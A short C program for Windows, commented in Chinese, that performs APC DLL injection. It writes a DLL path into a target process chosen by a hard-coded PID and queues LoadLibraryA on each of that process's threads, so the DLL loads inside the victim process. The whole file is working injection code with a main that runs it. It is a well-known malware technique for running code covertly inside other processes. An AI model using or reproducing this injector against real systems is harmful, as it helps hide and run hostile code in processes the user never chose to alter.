#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// APC注入
BOOL ApcInjectDll(DWORD dwPid, char * szDllName)
{
    // 计算欲注入 DLL 文件完整路径的长度
    int nDllLen = lstrlen(szDllName) + sizeof(char);

    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE, dwPid);
    if (hProcess == NULL)
    {
        return FALSE;
    }
    // 在目标进程申请一块长度为 nDllLen 大小的内存空间
    PVOID pDllAddr = VirtualAllocEx(hProcess,NULL, nDllLen,MEM_COMMIT,PAGE_READWRITE);
    if (pDllAddr == NULL)
    {
        CloseHandle(hProcess);
        return FALSE;
    }
    DWORD dwWriteNum = 0;
    // 将欲注入 DLL 文件的完整路径写入在目标进程中申请的空间内
    WriteProcessMemory(hProcess, pDllAddr, szDllName,nDllLen, &dwWriteNum);
    CloseHandle(hProcess);

    THREADENTRY32 te = { 0 };
    te.dwSize = sizeof(THREADENTRY32);
    //得到线程快照
    HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (INVALID_HANDLE_VALUE == handleSnap)
    {
        CloseHandle(hProcess);
        return FALSE;
    }
    // 获得 LoadLibraryA()函数的地址
    FARPROC pFunAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    DWORD dwRet = 0;
    //得到第一个线程
    if (Thread32First(handleSnap, &te))
    {
        do
        {
            //进行进程 ID 对比
            if (te.th32OwnerProcessID == dwPid)
            {
                //得到线程句柄
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS,FALSE,te.th32ThreadID);
                if (hThread)
                {
                    //向线程插入 APC
                    dwRet = QueueUserAPC((PAPCFUNC)pFunAddr,hThread,(ULONG_PTR)pDllAddr);
                    //关闭句柄
                    CloseHandle(hThread);
                }
            }
            //循环下一个线程
        } while (Thread32Next(handleSnap, &te));
    }
    CloseHandle(handleSnap);
    return TRUE;
}

int main(int argc, char *argv[])
{
    ApcInjectDll(9608, "c:/x86.dll");
    system("pause");
    return 0;
}
